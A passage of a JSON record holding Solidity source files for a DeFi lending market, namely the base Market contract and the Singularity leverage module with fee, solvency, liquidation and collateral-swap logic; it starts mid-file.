minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        // Let this fail first to save gas:\n        uint256 supplyShare = yieldBox.toShare(assetId, supplyAmount, true);\n        if (supplyShare > 0) {\n            yieldBox.transfer(from, address(swapper), assetId, supplyShare);\n        }\n\n        uint256 borrowShare;\n        (, borrowShare) = _borrow(from, address(swapper), borrowAmount);\n\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            assetId,\n            collateralId,\n            0,\n            supplyShare + borrowShare,\n            true,\n            true\n        );\n\n        uint256 collateralShare;\n        (amountOut, collateralShare) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n\n        _allowedBorrow(from, collateralShare);\n        _addCollateral(from, from, false, 0, collateralShare);\n    }\n}"
    },
    {
      "filename": "contracts/markets/Market.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"@boringcrypto/boring-solidity/contracts/BoringOwnable.sol\";\nimport \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\n\nimport \"tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol\";\nimport \"tapioca-periph/contracts/interfaces/IOracle.sol\";\nimport \"tapioca-periph/contracts/interfaces/IPenrose.sol\";\nimport \"./MarketERC20.sol\";\n\n/// @title Market contract\n/// @notice Market contract implemented by Singularity & BigBang\nabstract contract Market is MarketERC20, BoringOwnable {\n    using RebaseLibrary for Rebase;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    /// @notice returns YieldBox address\n    YieldBox public yieldBox;\n    /// @notice returns Penrose address\n    IPenrose public penrose;\n\n    /// @notice collateral token address\n    IERC20 public collateral;\n    /// @notice collateral token YieldBox id\n    uint256 public collateralId;\n    /// @notice asset token address\n    IERC20 public asset;\n    /// @notice asset token YieldBox id\n    uint256 public assetId;\n\n    /// @notice contract's pause state\n    bool public paused;\n    /// @notice conservator's addresss\n    /// @dev conservator can pause/unpause the contract\n    address public conservator;\n\n    /// @notice oracle address\n    IOracle public oracle;\n    /// @notice oracleData\n    bytes public oracleData;\n    /// @notice Exchange and interest rate tracking.\n    /// This is 'cached' here because calls to Oracles can be very expensive.\n    /// Asset -> collateral = assetAmount * exchangeRate.\n    uint256 public exchangeRate;\n\n    /// @notice total amount borrowed\n    /// @dev elastic = Total token amount to be repayed by borrowers, base = Total parts of the debt held by borrowers\n    Rebase public totalBorrow;\n    /// @notice total collateral supplied\n    uint256 public totalCollateralShare;\n    /// @notice max borrow cap\n    uint256 public totalBorrowCap;\n    /// @notice borrow amount per user\n    mapping(address => uint256) public userBorrowPart;\n    /// @notice collateral share per user\n    mapping(address => uint256) public userCollateralShare;\n\n    /// @notice liquidation caller rewards\n    uint256 public callerFee; // 90%\n    /// @notice liquidation protocol rewards\n    uint256 public protocolFee; // 10%\n    /// @notice min % a liquidator can receive in rewards\n    uint256 public minLiquidatorReward = 1e3; //1%\n    /// @notice max % a liquidator can receive in rewards\n    uint256 public maxLiquidatorReward = 1e4; //10%\n    /// @notice max liquidatable bonus amount\n    /// @dev max % added to the amount that can be liquidated\n    uint256 public liquidationBonusAmount = 1e4; //10%\n    /// @notice collateralization rate\n    uint256 public collateralizationRate; // 75%\n    /// @notice borrowing opening fee\n    uint256 public borrowOpeningFee = 50; //0.05%\n    /// @notice liquidation multiplier used to compute liquidator rewards\n    uint256 public liquidationMultiplier = 12000; //12%\n\n    // ***************** //\n    // *** CONSTANTS *** //\n    // ***************** //\n    uint256 internal EXCHANGE_RATE_PRECISION; //not costant, but can only be set in the 'init' method\n    uint256 internal constant FEE_PRECISION = 1e5;\n    uint256 internal constant FEE_PRECISION_DECIMALS = 5;\n\n    // ************** //\n    // *** EVENTS *** //\n    // ************** //\n    /// @notice event emitted when conservator is updated\n    event ConservatorUpdated(address indexed old, address indexed _new);\n    /// @notice event emitted when pause state is changed\n    event PausedUpdated(bool oldState, bool newState);\n    /// @notice event emitted when cached exchange rate is updated\n    event LogExchangeRate(uint256 rate);\n    /// @notice event emitted when borrow cap is updated\n    event LogBorrowCapUpdated(uint256 _oldVal, uint256 _newVal);\n    /// @notice event emitted when oracle data is updated\n    event OracleDataUpdated();\n    /// @notice event emitted when oracle is updated\n    event OracleUpdated();\n    /// @notice event emitted when a position is liquidated\n    event Liquidated(\n        address liquidator,\n        address[] users,\n        uint256 liquidatorReward,\n        uint256 protocolReward,\n        uint256 repayedAmount,\n        uint256 collateralShareRemoved\n    );\n    /// @notice event emitted when borrow opening fee is updated\n    event LogBorrowingFee(uint256 _oldVal, uint256 _newVal);\n    /// @notice event emitted when the liquidation multiplier rate is updated\n    event LiquidationMultiplierUpdated(uint256 oldVal, uint256 newVal);\n\n    modifier notPaused() {\n        require(!paused, \"Market: paused\");\n        _;\n    }\n    /// @dev Checks if the user is solvent in the closed liquidation case at the end of the function body.\n    modifier solvent(address from) {\n        updateExchangeRate();\n        _accrue();\n\n        _;\n\n        require(_isSolvent(from, exchangeRate), \"Market: insolvent\");\n    }\n\n    bool internal initialized;\n    modifier onlyOnce() {\n        require(!initialized, \"Market: initialized\");\n        _;\n        initialized = true;\n    }\n\n    // *********************** //\n    // *** OWNER FUNCTIONS *** //\n    // *********************** //\n    /// @notice sets the borrowing opening fee\n    /// @dev can only be called by the owner\n    /// @param _val the new value\n    function setBorrowOpeningFee(uint256 _val) external onlyOwner {\n        require(_val <= FEE_PRECISION, \"Market: not valid\");\n        emit LogBorrowingFee(borrowOpeningFee, _val);\n        borrowOpeningFee = _val;\n    }\n\n    /// @notice sets max borrowable amount\n    /// @dev can only be called by the owner\n    /// @param _cap the new value\n    function setBorrowCap(uint256 _cap) external notPaused onlyOwner {\n        emit LogBorrowCapUpdated(totalBorrowCap, _cap);\n        totalBorrowCap = _cap;\n    }\n\n    /// @notice sets common market configuration\n    /// @dev values are updated only if > 0 or not address(0)\n    function setMarketConfig(\n        uint256 _borrowOpeningFee,\n        IOracle _oracle,\n        bytes calldata _oracleData,\n        address _conservator,\n        uint256 _callerFee,\n        uint256 _protocolFee,\n        uint256 _liquidationBonusAmount,\n        uint256 _minLiquidatorReward,\n        uint256 _maxLiquidatorReward,\n        uint256 _totalBorrowCap,\n        uint256 _collateralizationRate\n    ) external onlyOwner {\n        if (_borrowOpeningFee > 0) {\n            require(_borrowOpeningFee <= FEE_PRECISION, \"Market: not valid\");\n            emit LogBorrowingFee(borrowOpeningFee, _borrowOpeningFee);\n            borrowOpeningFee = _borrowOpeningFee;\n        }\n\n        if (address(_oracle) != address(0)) {\n            oracle = _oracle;\n            emit OracleUpdated();\n        }\n\n        if (_oracleData.length > 0) {\n            oracleData = _oracleData;\n            emit OracleDataUpdated();\n        }\n\n        if (_conservator != address(0)) {\n            emit ConservatorUpdated(conservator, _conservator);\n            conservator = _conservator;\n        }\n\n        if (_callerFee > 0) {\n            require(_callerFee <= FEE_PRECISION, \"Market: not valid\");\n            callerFee = _callerFee;\n        }\n\n        if (_protocolFee > 0) {\n            require(_protocolFee <= FEE_PRECISION, \"Market: not valid\");\n            protocolFee = _protocolFee;\n        }\n\n        if (_liquidationBonusAmount > 0) {\n            require(\n                _liquidationBonusAmount < FEE_PRECISION,\n                \"Market: not valid\"\n            );\n            liquidationBonusAmount = _liquidationBonusAmount;\n        }\n\n        if (_minLiquidatorReward > 0) {\n            require(_minLiquidatorReward < FEE_PRECISION, \"Market: not valid\");\n            require(\n                _minLiquidatorReward < maxLiquidatorReward,\n                \"Market: not valid\"\n            );\n            minLiquidatorReward = _minLiquidatorReward;\n        }\n\n        if (_maxLiquidatorReward > 0) {\n            require(_maxLiquidatorReward < FEE_PRECISION, \"Market: not valid\");\n            require(\n                _maxLiquidatorReward > minLiquidatorReward,\n                \"Market: not valid\"\n            );\n            maxLiquidatorReward = _maxLiquidatorReward;\n        }\n\n        if (_totalBorrowCap > 0) {\n            emit LogBorrowCapUpdated(totalBorrowCap, _totalBorrowCap);\n            totalBorrowCap = _totalBorrowCap;\n        }\n\n        if (_collateralizationRate > 0) {\n            require(\n                _collateralizationRate <= FEE_PRECISION,\n                \"Market: not valid\"\n            );\n            collateralizationRate = _collateralizationRate;\n        }\n    }\n\n    /// @notice updates the pause state of the contract\n    /// @dev can only be called by the conservator\n    /// @param val the new value\n    function updatePause(bool val) external {\n        require(msg.sender == conservator, \"Market: unauthorized\");\n        require(val != paused, \"Market: same state\");\n        emit PausedUpdated(paused, val);\n        paused = val;\n    }\n\n    // ********************** //\n    // *** VIEW FUNCTIONS *** //\n    // ********************** //\n    /// @notice returns the maximum liquidatable amount for user\n    function computeClosingFactor(\n        uint256 borrowPart,\n        uint256 collateralPartInAsset,\n        uint256 borrowPartDecimals,\n        uint256 collateralPartDecimals,\n        uint256 ratesPrecision\n    ) public view returns (uint256) {\n        uint256 borrowPartScaled = borrowPart;\n        if (borrowPartDecimals > 18) {\n            borrowPartScaled = borrowPart / (10 ** (borrowPartDecimals - 18));\n        }\n        if (borrowPartDecimals < 18) {\n            borrowPartScaled = borrowPart * (10 ** (18 - borrowPartDecimals));\n        }\n\n        uint256 collateralPartInAssetScaled = collateralPartInAsset;\n        if (collateralPartDecimals > 18) {\n            collateralPartInAssetScaled =\n                collateralPartInAsset /\n                (10 ** (collateralPartDecimals - 18));\n        }\n        if (collateralPartDecimals < 18) {\n            collateralPartInAssetScaled =\n                collateralPartInAsset *\n                (10 ** (18 - collateralPartDecimals));\n        }\n\n        uint256 liquidationStartsAt = (collateralPartInAssetScaled *\n            collateralizationRate) / (10 ** ratesPrecision);\n        if (borrowPartScaled < liquidationStartsAt) return 0;\n\n        uint256 numerator = borrowPartScaled -\n            ((collateralizationRate * collateralPartInAssetScaled) /\n                (10 ** ratesPrecision));\n        uint256 denominator = ((10 ** ratesPrecision) -\n            (collateralizationRate *\n                ((10 ** ratesPrecision) + liquidationMultiplier)) /\n            (10 ** ratesPrecision)) * (10 ** (18 - ratesPrecision));\n\n        uint256 x = (numerator * 1e18) / denominator;\n        return x;\n    }\n\n    /// @notice return the amount of collateral for a `user` to be solvent, min TVL and max TVL. Returns 0 if user already solvent.\n    /// @dev we use a `CLOSED_COLLATERIZATION_RATE` that is a safety buffer when making the user solvent again,\n    ///      to prevent from being liquidated. This function is valid only if user is not solvent by `_isSolvent()`.\n    /// @param user The user to check solvency.\n    /// @param _exchangeRate the exchange rate asset/collateral.\n    /// @return amountToSolvency the amount of collateral to be solvent.\n    function computeTVLInfo(\n        address user,\n        uint256 _exchangeRate\n    )\n        public\n        view\n        returns (uint256 amountToSolvency, uint256 minTVL, uint256 maxTVL)\n    {\n        uint256 borrowPart = userBorrowPart[user];\n        if (borrowPart == 0) return (0, 0, 0);\n\n        Rebase memory _totalBorrow = totalBorrow;\n\n        uint256 collateralAmountInAsset = _computeMaxBorrowableAmount(\n            user,\n            _exchangeRate\n        );\n\n        borrowPart = (borrowPart * _totalBorrow.elastic) / _totalBorrow.base;\n\n        amountToSolvency = borrowPart >= collateralAmountInAsset\n            ? borrowPart - collateralAmountInAsset\n            : 0;\n\n        (minTVL, maxTVL) = _computeMaxAndMinLTVInAsset(\n            userCollateralShare[user],\n            _exchangeRate\n        );\n    }\n\n    /// @notice Gets the exchange rate. I.e how much collateral to buy 1e18 asset.\n    /// @dev This function is supposed to be invoked if needed because Oracle queries can be expensive.\n    ///      Oracle should consider USDO at 1$\n    /// @return updated True if `exchangeRate` was updated.\n    /// @return rate The new exchange rate.\n    function updateExchangeRate() public returns (bool updated, uint256 rate) {\n        (updated, rate) = oracle.get(\"\");\n\n        if (updated) {\n            require(rate > 0, \"Market: invalid rate\");\n            exchangeRate = rate;\n            emit LogExchangeRate(rate);\n        } else {\n            // Return the old rate if fetching wasn't successful\n            rate = exchangeRate;\n        }\n    }\n\n    /// @notice computes the possible liquidator reward\n    /// @notice user the user for which a liquidation operation should be performed\n    /// @param _exchangeRate the exchange rate asset/collateral to use for internal computations\n    function computeLiquidatorReward(\n        address user,\n        uint256 _exchangeRate\n    ) public view returns (uint256) {\n        (uint256 minTVL, uint256 maxTVL) = _computeMaxAndMinLTVInAsset(\n            userCollateralShare[user],\n            _exchangeRate\n        );\n        return _getCallerReward(userBorrowPart[user], minTVL, maxTVL);\n    }\n\n    // ************************** //\n    // *** INTERNAL FUNCTIONS *** //\n    // ************************** //\n    function _accrue() internal virtual;\n\n    function _getRevertMsg(\n        bytes memory _returnData\n    ) internal pure returns (string memory) {\n        // If the _res length is less than 68, then the transaction failed silently (without a revert message)\n        if (_returnData.length < 68) return \"Market: no return data\";\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            // Slice the sighash.\n            _returnData := add(_returnData, 0x04)\n        }\n        return abi.decode(_returnData, (string)); // All that remains is the revert string\n    }\n\n    function _computeMaxBorrowableAmount(\n        address user,\n        uint256 _exchangeRate\n    ) internal view returns (uint256 collateralAmountInAsset) {\n        collateralAmountInAsset =\n            yieldBox.toAmount(\n                collateralId,\n                (userCollateralShare[user] *\n                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *\n                    collateralizationRate),\n                false\n            ) /\n            _exchangeRate;\n    }\n\n    /// @notice Concrete implementation of `isSolvent`. Includes a parameter to allow caching `exchangeRate`.\n    /// @param _exchangeRate The exchange rate. Used to cache the `exchangeRate` between calls.\n    function _isSolvent(\n        address user,\n        uint256 _exchangeRate\n    ) internal view returns (bool) {\n        // accrue must have already been called!\n        uint256 borrowPart = userBorrowPart[user];\n        if (borrowPart == 0) return true;\n        uint256 collateralShare = userCollateralShare[user];\n        if (collateralShare == 0) return false;\n\n        Rebase memory _totalBorrow = totalBorrow;\n\n        return\n            yieldBox.toAmount(\n                collateralId,\n                collateralShare *\n                    (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *\n                    collateralizationRate,\n                false\n            ) >=\n            // Moved exchangeRate here instead of dividing the other side to preserve more precision\n            (borrowPart * _totalBorrow.elastic * _exchangeRate) /\n                _totalBorrow.base;\n    }\n\n    /// @notice Returns the min and max LTV for user in asset price\n    function _computeMaxAndMinLTVInAsset(\n        uint256 collateralShare,\n        uint256 _exchangeRate\n    ) internal view returns (uint256 min, uint256 max) {\n        uint256 collateralAmount = yieldBox.toAmount(\n            collateralId,\n            collateralShare,\n            false\n        );\n\n        max = (collateralAmount * EXCHANGE_RATE_PRECISION) / _exchangeRate;\n        min = (max * collateralizationRate) / FEE_PRECISION;\n    }\n\n    function _getCallerReward(\n        uint256 borrowed,\n        uint256 startTVLInAsset,\n        uint256 maxTVLInAsset\n    ) internal view returns (uint256) {\n        if (borrowed == 0) return 0;\n        if (startTVLInAsset == 0) return 0;\n\n        if (borrowed < startTVLInAsset) return 0;\n        if (borrowed >= maxTVLInAsset) return minLiquidatorReward;\n\n        uint256 rewardPercentage = ((borrowed - startTVLInAsset) *\n            FEE_PRECISION) / (maxTVLInAsset - startTVLInAsset);\n\n        int256 diff = int256(minLiquidatorReward) - int256(maxLiquidatorReward);\n        int256 reward = (diff * int256(rewardPercentage)) /\n            int256(FEE_PRECISION) +\n            int256(maxLiquidatorReward);\n\n        return uint256(reward);\n    }\n\n    function _computeAllowanceAmountInAsset(\n        address user,\n        uint256 _exchangeRate,\n        uint256 borrowAmount,\n        uint256 assetDecimals\n    ) internal view returns (uint256) {\n        uint256 maxBorrowabe = _computeMaxBorrowableAmount(user, _exchangeRate);\n\n        uint256 shareRatio = _getRatio(\n            borrowAmount,\n            maxBorrowabe,\n            assetDecimals\n        );\n        return (shareRatio * userCollateralShare[user]) / (10 ** assetDecimals);\n    }\n\n    function _getRatio(\n        uint256 numerator,\n        uint256 denominator,\n        uint256 precision\n    ) private pure returns (uint256) {\n        if (numerator == 0 || denominator == 0) {\n            return 0;\n        }\n        uint256 _numerator = numerator * 10 ** (precision + 1);\n        uint256 _quotient = ((_numerator / denominator) + 5) / 10;\n        return (_quotient);\n    }\n}"
    },
    {
      "filename": "contracts/markets/singularity/SGLLeverage.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"./SGLLendingCommon.sol\";\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\nimport {ITapiocaOFT} from \"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol\";\n\n/// @title Singularity leverage module\n/// @notice Singularity module for leverage type actions\ncontract SGLLeverage is SGLLendingCommon {\n    using RebaseLibrary for Rebase;\n    using BoringERC20 for IERC20;\n\n    /// @notice Level up cross-chain: Borrow more and buy collateral with it.\n    /// @param from The user who sells\n    /// @param collateralAmount Extra collateral to be added\n    /// @param borrowAmount Borrowed amount that will be swapped into collateral\n    /// @param swapData Swap data used on destination chain for swapping USDO to the underlying TOFT token\n    /// @param lzData LayerZero specific data\n    /// @param externalData External contracts used for the cross chain operation\n    function multiHopBuyCollateral(\n        address from,\n        uint256 collateralAmount,\n        uint256 borrowAmount,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable notPaused solvent(from) {\n        require(\n            penrose.swappers(ISwapper(externalData.swapper)),\n            \"SGL: Invalid swapper\"\n        );\n\n        //add collateral\n        uint256 collateralShare = yieldBox.toShare(\n            collateralId,\n            collateralAmount,\n            false\n        );\n        _allowedBorrow(from, collateralShare);\n        _addCollateral(from, from, false, 0, collateralShare);\n\n        //borrow\n        (, uint256 borrowShare) = _borrow(from, from, borrowAmount);\n\n        //withdraw\n        yieldBox.withdraw(assetId, from, address(this), 0, borrowShare);\n\n        IUSDOBase(address(asset)).sendForLeverage{value: msg.value}(\n            borrowAmount,\n            from,\n            lzData,\n            swapData,\n            externalData\n        );\n    }\n\n    function multiHopSellCollateral(\n        address from,\n        uint256 share,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable notPaused solvent(from) {\n        require(\n            penrose.swappers(ISwapper(externalData.swapper)),\n            \"SGL: Invalid swapper\"\n        );\n\n        _allowedBorrow(from, share);\n        _removeCollateral(from, address(this), share);\n        (uint256 amountOut, ) = yieldBox.withdraw(\n            collateralId,\n            address(this),\n            address(this),\n            0,\n            share\n        );\n\n        //send for unwrap\n        ITapiocaOFT(address(collateral)).sendForLeverage{value: msg.value}(\n            amountOut,\n            from,\n            lzData,\n            swapData,\n            externalData\n        );\n    }\n\n    /// @notice Lever down: Sell collateral to repay debt; excess goes to YB\n    /// @param from The user who sells\n    /// @param share Collateral YieldBox-shares to sell\n    /// @param minAmountOut Mininal proceeds required for the sale\n    /// @param swapper Swapper to execute the sale\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual asset amount received in the sale\n    function sellCollateral(\n        address from,\n        uint256 share,\n        uint256 minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        _allowedBorrow(from, share);\n        _removeCollateral(from, address(swapper), share);\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            collateralId,\n            assetId,\n            0,\n            share,\n            true,\n            true\n        );\n        uint256 shareOut;\n        (amountOut, shareOut) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        // As long as the ratio is correct, we trust `amountOut` resp.\n        // `shareOut`, because all money received by the swapper gets used up\n        // one way or another, or the transaction will revert.\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n        uint256 partOwed = userBorrowPart[from];\n        uint256 amountOwed = totalBorrow.toElastic(partOwed, true);\n        uint256 shareOwed = yieldBox.toShare(assetId, amountOwed, true);\n        if (shareOwed <= shareOut) {\n            _repay(from, from, false, partOwed);\n        } else {\n            //repay as much as we can\n            uint256 partOut = totalBorrow.toBase(amountOut, false);\n            _repay(from, from, false, partOut);\n        }\n    }\n\n    /// @notice Lever up: Borrow more and buy collateral with it.\n    /// @param from The user who buys\n    /// @param borrowAmount Amount of extra asset borrowed\n    /// @param supplyAmount Amount of asset supplied (down payment)\n    /// @param minAmountOut Mininal collateral amount to receive\n    /// @param swapper Swapper to execute the purchase\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual collateral amount purchased\n    function buyCollateral(\n        address from,\n        uint256 borrowAmount,\n        uint256 supplyAmount,\n        uint256 minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        // Let this fail first to save gas:\n        uint256 supplyShare = yieldBox.toShare(assetId, supplyAmount, true);\n        if (supplyShare > 0) {\n            yieldBox.transfer(from, address(swapper), assetId, supplyShare);\n        }\n\n        uint256 borrowShare;\n        (, borrowShare) = _borrow(from, address(swapper), borrowAmount);\n\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            assetId,\n            collateralId,\n            0,\n            supplyShare + borrowShare,\n            true,\n            true\n        );\n\n        uint256 collateralShare;\n        (amountOut, collateralShare) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n\n        _allowedBorrow(from, collateralShare);\n        _addCollateral(from, from, false, 0, collateralShare);\n    }\n}"
    }
  ]
}